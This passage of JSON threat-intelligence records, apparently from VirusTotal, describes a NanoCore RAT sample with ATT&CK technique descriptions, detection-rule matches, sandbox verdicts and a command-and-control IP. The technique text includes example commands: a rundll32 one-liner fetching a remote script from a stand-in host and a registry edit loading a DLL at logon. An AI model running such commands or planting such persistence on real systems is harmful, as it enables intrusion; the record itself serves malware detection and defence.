                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. \nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"  This behavior has been seen used by malware such as Poweliks. \nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1).\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Runs a DLL by calling functions"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1218/011/",
                "id": "T1218.011",
                "name": "Rundll32"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "HIGH",
                    "description": "System process connects to network (likely due to code injection)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates an autostart registry key"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1547/001/",
                "id": "T1547.001",
                "name": "Registry Run Keys / Startup Folder"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/f3ea4611c72d57eabf381d5639c3c8d1840cb005ed811f3038410fb2e04978c1/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "6596a58406bafd61c48fcc57"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T19CD423292358EB4EE8715BFE89B1C900EFF0652B946BE69C4C4154DE4BD7B5806C2F83",
      "vhash": "265036751512608b18207222",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "crowdsourced_yara_results": [
        {
          "rule_name": "MALWARE_Win_NanoCore",
          "description": "Detects NanoCore",
          "author": "ditekSHen",
          "ruleset_id": "00cc803bdc",
          "ruleset_name": "malware",
          "match_in_subfile": true,
          "source": "https://github.com/ditekshen/detection"
        },
        {
          "source": "https://github.com/elastic/protections-artifacts",
          "author": "Elastic Security",
          "ruleset_name": "Windows_Trojan_Nanocore",
          "rule_name": "Windows_Trojan_Nanocore_d8c4e3c5",
          "ruleset_id": "0156ce7a5c",
          "match_in_subfile": true
        },
        {
          "rule_name": "Nanocore_RAT_Gen_2",
          "description": "Detetcs the Nanocore RAT",
          "author": "Florian Roth (Nextron Systems)",
          "ruleset_id": "00003d4657",
          "ruleset_name": "apt_nanocore_rat",
          "match_in_subfile": true,
          "source": "https://github.com/Neo23x0/signature-base"
        },
        {
          "rule_name": "Nanocore_RAT_Feb18_1",
          "description": "Detects Nanocore RAT",
          "author": "Florian Roth (Nextron Systems)",
          "ruleset_id": "00003d4657",
          "ruleset_name": "apt_nanocore_rat",
          "match_in_subfile": true,
          "source": "https://github.com/Neo23x0/signature-base"
        },
        {
          "rule_name": "Nanocore",
          "description": "detect Nanocore in memory",
          "author": "JPCERT/CC Incident Response Group",
          "ruleset_id": "004629696d",
          "ruleset_name": "rule",
          "match_in_subfile": true,
          "source": "https://github.com/JPCERTCC/MalConfScan"
        },
        {
          "rule_name": "RAT_NanoCore",
          "description": "NanoCore Remote Access Trojan",
          "author": "king-tero",
          "ruleset_id": "0074b28812",
          "ruleset_name": "RATs",
          "match_in_subfile": true,
          "source": "https://github.com/king-tero/yara-rules"
        }
      ],
      "creation_date": 1697451919,
      "names": [
        "plugmanzx.exe",
        "YcGF.exe",
        "dfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858.exe",
        "NEAS.NEASdfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858exeexe.exe",
        "dfb9b.exe",
        "wanmgr.exe",
        "cc4785f780b286ccdaf01c38bbbc809d.exe"
      ],
      "signature_info": {
        "product": "TriviaNow",
        "internal name": "YcGF.exe",
        "copyright": "Copyright ©  2017",
        "original name": "YcGF.exe",
        "file version": "1.0.0.0",
        "description": "TriviaNow"
      },
      "last_modification_date": 1698544874,
      "type_tag": "peexe",
      "times_submitted": 11,
      "total_votes": {
        "harmless": 0,
        "malicious": 2
      },
      "size": 628736,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.msil/agensla",
        "popular_threat_category": [
          {
            "count": 27,
            "value": "trojan"
          },
          {
            "count": 2,
            "value": "pua"
          }
        ],
        "popular_threat_name": [
          {
            "count": 11,
            "value": "msil"
          },
          {
            "count": 5,
            "value": "agensla"
          },
          {
            "count": 2,
            "value": "agenttesla"
          }
        ]
      },
      "authentihash": "eb8fd4ff0d8d0564d811701f120c1e6448bcff9c3e2cade0c841943a89f76359",
      "detectiteasy": {
        "filetype": "PE32",
        "values": [
          {
            "version": "v4.0.30319",
            "type": "Library",
            "name": ".NET"
          },
          {
            "type": "Compiler",
            "name": "VB.NET"
          },
          {
            "type": "Compiler",
            "name": "VB.NET"
          },
          {
            "version": "v4.0.30319",
            "type": "Library",
            "name": ".NET"
          },
          {
            "type": "Linker",
            "name": "Microsoft Linker"
          }
        ]
      },
      "last_submission_date": 1698537632,
      "sigma_analysis_results": [
        {
          "rule_title": "Scheduled temp file as task from temp location",
          "rule_source": "Joe Security Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-C5EF-652D-2C06-000000004400}",
                "ProcessId": "4072",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Task Scheduler Configuration Tool",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-C5ED-652D-2B06-000000004400}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D",
                "OriginalFileName": "schtasks.exe",
                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "ParentProcessId": "3920",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "CommandLine": "\"schtasks.exe\" /create /f /tn \"WAN Manager\" /xml \"C:\\Users\\george\\AppData\\Local\\Temp\\tmp5184.tmp\"",
                "EventID": "1",
                "LogonGuid": "C784477D-EFEF-6489-A1E5-030000000000",
                "LogonId": "255393",
                "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\"",
                "UtcTime": "1697498607",
                "RuleName": "-"
              }
            },
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-C5EF-652D-2E06-000000004400}",
                "ProcessId": "7464",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Task Scheduler Configuration Tool",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-C5ED-652D-2B06-000000004400}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D",
                "OriginalFileName": "schtasks.exe",
                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "ParentProcessId": "3920",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "CommandLine": "\"schtasks.exe\" /create /f /tn \"WAN Manager Task\" /xml \"C:\\Users\\george\\AppData\\Local\\Temp\\tmp52BD.tmp\"",
                "EventID": "1",
                "LogonGuid": "C784477D-EFEF-6489-A1E5-030000000000",
                "LogonId": "255393",
                "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\"",
                "UtcTime": "1697498607",
                "RuleName": "-"
              }
            }
          ],
          "rule_level": "critical",
          "rule_description": "Scheduled temp file as task from temp location",
          "rule_author": "Joe Security",
          "rule_id": "90af0ea1f6d871f169dfb41b18545bf456f980c5d75f60f1293c34f071f6a31c"
        },
        {
          "rule_title": "Suspicious Schtasks From Env Var Folder",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-C5EF-652D-2C06-000000004400}",
                "ProcessId": "4072",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Task Scheduler Configuration Tool",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-C5ED-652D-2B06-000000004400}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D",
                "OriginalFileName": "schtasks.exe",
                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "ParentProcessId": "3920",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "CommandLine": "\"schtasks.exe\" /create /f /tn \"WAN Manager\" /xml \"C:\\Users\\george\\AppData\\Local\\Temp\\tmp5184.tmp\"",
                "EventID": "1",
                "LogonGuid": "C784477D-EFEF-6489-A1E5-030000000000",
                "LogonId": "255393",
                "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\"",
                "UtcTime": "1697498607",
                "RuleName": "-"
              }
            },
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-C5EF-652D-2E06-000000004400}",
                "ProcessId": "7464",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Task Scheduler Configuration Tool",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-C5ED-652D-2B06-000000004400}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D",
                "OriginalFileName": "schtasks.exe",
                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "ParentProcessId": "3920",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "CommandLine": "\"schtasks.exe\" /create /f /tn \"WAN Manager Task\" /xml \"C:\\Users\\george\\AppData\\Local\\Temp\\tmp52BD.tmp\"",
                "EventID": "1",
                "LogonGuid": "C784477D-EFEF-6489-A1E5-030000000000",
                "LogonId": "255393",
                "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\"",
                "UtcTime": "1697498607",
                "RuleName": "-"
              }
            }
          ],
          "rule_level": "high",
          "rule_description": "Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware",
          "rule_author": "Florian Roth (Nextron Systems)",
          "rule_id": "0533322c5c44794b71e761cd351a2459aad6e21ae95c9543d4c9fdb3c8fde6c4"
        },
        {
          "rule_title": "Wow6432Node CurrentVersion Autorun Keys Modification",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "ProcessId": "3920",
                "EventType": "SetValue",
                "Image": "C:\\Users\\george\\Desktop\\software.exe",
                "ProcessGuid": "{C784477D-C5ED-652D-2B06-000000004400}",
                "UtcTime": "1697498607",
                "Details": "C:\\Program Files (x86)\\WAN Manager\\wanmgr.exe",
                "RuleName": "T1060,RunKey",
                "TargetObject": "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\WAN Manager"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects modification of autostart extensibility point (ASEP) in registry.",
          "rule_author": "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)",
          "rule_id": "18842e32896dd83b8aca4d5e1ac78c1f66b1d252479c0023cdd02f108c42c8cd"
        },
        {
          "rule_title": "Change PowerShell Policies to an Insecure Level - PowerShell",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "4104",
                "ScriptBlockId": "f70b8195-a7d2-4977-9632-8f4c76d8fe5f",
                "ScriptBlockText": "f9c50298c31c4f832377cbc3805f78dcf568835d7138c21088e56a2c5768f935",
                "MessageNumber": "1",
                "Path": "",
                "MessageTotal": "1"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects use of Set-ExecutionPolicy to set insecure policies",
          "rule_author": "frack113",
          "rule_id": "5572c8188426269a10ccb41fc8e9c8445391ac38a0917621b0a1ee05ec99aac9"
        },
        {
          "rule_title": "Suspicious Scheduled Task Creation via Masqueraded XML File",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-C5EF-652D-2C06-000000004400}",
                "ProcessId": "4072",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Task Scheduler Configuration Tool",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-C5ED-652D-2B06-000000004400}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D",
                "OriginalFileName": "schtasks.exe",
                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "ParentProcessId": "3920",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "CommandLine": "\"schtasks.exe\" /create /f /tn \"WAN Manager\" /xml \"C:\\Users\\george\\AppData\\Local\\Temp\\tmp5184.tmp\"",
                "EventID": "1",
                "LogonGuid": "C784477D-EFEF-6489-A1E5-030000000000",
                "LogonId": "255393",
                "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\"",
                "UtcTime": "1697498607",
                "RuleName": "-"
              }
            },
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-C5EF-652D-2E06-000000004400}",
                "ProcessId": "7464",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Task Scheduler Configuration Tool",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-C5ED-652D-2B06-000000004400}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D",
                "OriginalFileName": "schtasks.exe",
                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "ParentProcessId": "3920",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "CommandLine": "\"schtasks.exe\" /create /f /tn \"WAN Manager Task\" /xml \"C:\\Users\\george\\AppData\\Local\\Temp\\tmp52BD.tmp\"",
                "EventID": "1",
                "LogonGuid": "C784477D-EFEF-6489-A1E5-030000000000",
                "LogonId": "255393",
                "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\"",
                "UtcTime": "1697498607",
                "RuleName": "-"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects the creation of a scheduled task using the \"-XML\" flag with a file without the '.xml' extension. This behavior could be indicative of potential defense evasion attempt during persistence",
          "rule_author": "Swachchhanda Shrawan Poudel, Elastic (idea)",
          "rule_id": "b0f576aead127b964909d75f26e113ee55e88fb8d2bac31fe4a5c12337b4f327"
        },
        {
          "rule_title": "Suspicious Get-WmiObject",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "4104",
                "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
                "ScriptBlockId": "8fe3efbd-853a-44c8-a79e-7fae9a574596",
                "MessageNumber": "1",
                "Path": "",
                "MessageTotal": "1"
              }
            },
            {
              "values": {
                "EventID": "4104",
                "ScriptBlockId": "667efede-0083-4509-b112-8287a2f25803",
                "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
                "MessageNumber": "1",
                "MessageTotal": "1",
                "Path": ""
              }
            },
            {
              "values": {
                "EventID": "4104",
                "ScriptBlockId": "4a0b66fa-b2f1-4fb5-9a0e-a402ec92b474",
                "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
                "MessageNumber": "1",
                "MessageTotal": "1",
                "Path": ""
              }
            },
            {
              "values": {
                "EventID": "4104",
                "ScriptBlockId": "14fd127e-f3a9-4ac0-9228-0963d661a09e",
                "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
                "MessageNumber": "1",
                "Path": "",
                "MessageTotal": "1"
              }
            },
            {
              "values": {
                "EventID": "4104",
                "ScriptBlockId": "0425096d-a6cd-4556-90f8-946ad7751f3d",
                "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
                "MessageNumber": "1",
                "Path": "",
                "MessageTotal": "1"
              }
            },
            {
              "values": {
                "EventID": "4104",
                "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
                "ScriptBlockId": "cd3d000a-36a2-4d4e-a4fe-0149972fec47",
                "MessageNumber": "1",
                "Path": "",
                "MessageTotal": "1"
              }
            },
            {
              "values": {
                "EventID": "4104",
                "ScriptBlockId": "4cf1bf47-615b-4110-96e0-b1f9a08077e7",
                "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
                "MessageNumber": "1",
                "Path": "",
                "MessageTotal": "1"
              }
            }
          ],
          "rule_level": "low",
          "rule_description": "The infrastructure for management data and operations that enables local and remote management of Windows personal computers and servers",
          "rule_author": "frack113",
          "rule_id": "1f7f8b1e9005dd4d64cb9d30ed53ee94f68fb96262fbd72f7a0266881149c79f"
        },
        {
          "rule_title": "Scheduled Task Created - FileCreation",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "11",
                "ProcessId": "1500",
                "TargetFilename": "C:\\Windows\\System32\\Tasks\\WAN Manager",
                "RuleName": "T1053",
                "CreationUtcTime": "1697498607",
                "UtcTime": "1697498607",
                "ProcessGuid": "{C784477D-EFEB-6489-2300-000000004400}",
                "Image": "c:\\windows\\system32\\svchost.exe"
              }
            },
            {
              "values": {
                "EventID": "11",
                "ProcessId": "1500",
                "Image": "c:\\windows\\system32\\svchost.exe",
                "ProcessGuid": "{C784477D-EFEB-6489-2300-000000004400}",
                "CreationUtcTime": "1697498607",
                "UtcTime": "1697498607",
                "RuleName": "T1053",
                "TargetFilename": "C:\\Windows\\System32\\Tasks\\WAN Manager Task"
              }
            }
          ],
          "rule_level": "low",
          "rule_description": "Detects the creation of a scheduled task via file creation.",
          "rule_author": "Center for Threat Informed Defense (CTID) Summiting the Pyramid Team",
          "rule_id": "3418c5891b9d0a4ec974985072278b35b0a0f0254118d766d07553a547284b87"
        }
      ],
      "meaningful_name": "YcGF.exe",
      "crowdsourced_ids_stats": {
        "high": 8,
        "info": 0,
        "medium": 0,
        "low": 1
      },
      "trid": [
        {
          "file_type": "Generic CIL Executable (.NET, Mono, etc.)",
          "probability": 63
        },
        {
          "file_type": "Windows screen saver",
          "probability": 11.2
        },
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 9
        },
        {
          "file_type": "Win32 Dynamic Link Library (generic)",
          "probability": 5.6
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 3.8
        }
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 1,
          "medium": 3,
          "critical": 0,
          "low": 2
        },
        "Joe Security Rule Set (GitHub)": {
          "high": 0,
          "medium": 0,
          "critical": 1,
          "low": 0
        }
      },
      "sandbox_verdicts": {
        "VMRay": {
          "category": "malicious",
          "sandbox_name": "VMRay",
          "malware_classification": [
            "MALWARE"
          ],
          "malware_names": [
            "C2/Generic-A",
            "NanoCore"
          ]
        },
        "Zenbox": {
          "category": "malicious",
          "confidence": 100,
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "MALWARE",
            "TROJAN",
            "EVADER",
            "RAT"
          ],
          "malware_names": [
            "Nanocore"
          ]
        },
        "Yomi Hunter": {
          "category": "malicious",
          "sandbox_name": "Yomi Hunter",
          "malware_classification": [
            "MALWARE"
          ]
        },
        "C2AE": {
          "category": "malicious",
          "confidence": 70,
          "sandbox_name": "C2AE",
          "malware_classification": [
            "RAT"
          ],
          "malware_names": [
            "NanoCore"
          ]
        }
      },
      "sha256": "dfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858",
      "type_extension": "exe",
      "tags": [
        "malware",
        "assembly",
        "peexe",
        "detect-debug-environment",
        "long-sleeps",
        "checks-user-input",
        "spreader"
      ],
      "crowdsourced_ids_results": [
        {
          "rule_category": "A Network Trojan was detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE NanoCore RAT Keepalive Response 1",
          "rule_raw": "alert tcp $EXTERNAL_NET [!2504,!2505,!2032,1024:] -> $HOME_NET any (msg:\"ET MALWARE NanoCore RAT Keepalive Response 1\"; flow:established,to_client; dsize:36; content:\"|20 00 00 00|\"; depth:4; content:!\"|F0 DE BC 0A|\"; within:5; content:!\"|00 00 00 00|\"; within:4; content:!\"|20 00 00 00 01 00 00 00|\"; depth:8; content:!\"|20 00 00 00 eb 6e 00 00 00 00 00 00 08|\"; depth:13; flowbits:isset,ET.NanoCore; threshold: type both, track by_src, count 10, seconds 120; stream_size:client, <, 5000; reference:md5,bf994dce3712fb66afa4a2ce5b3ceee4; reference:url,medium.com/@the_abjuri5t/nanocore-rat-hunting-guide-cb185473c1e0; classtype:trojan-activity; sid:2046909; rev:10; metadata:attack_target Client_Endpoint, created_at 2015_03_27, deployment Perimeter, former_category MALWARE, malware_family NanoCore, performance_impact Moderate, signature_severity Major, updated_at 2023_07_26, former_sid 2810290;)",
          "rule_url": "https://rules.emergingthreats.net/",
          "alert_context": [
            {
              "src_ip": "94.156.6.14",
              "src_port": 6110
            }
          ],
          "rule_references": [
            "https://www.virustotal.com/gui/search/bf994dce3712fb66afa4a2ce5b3ceee4",
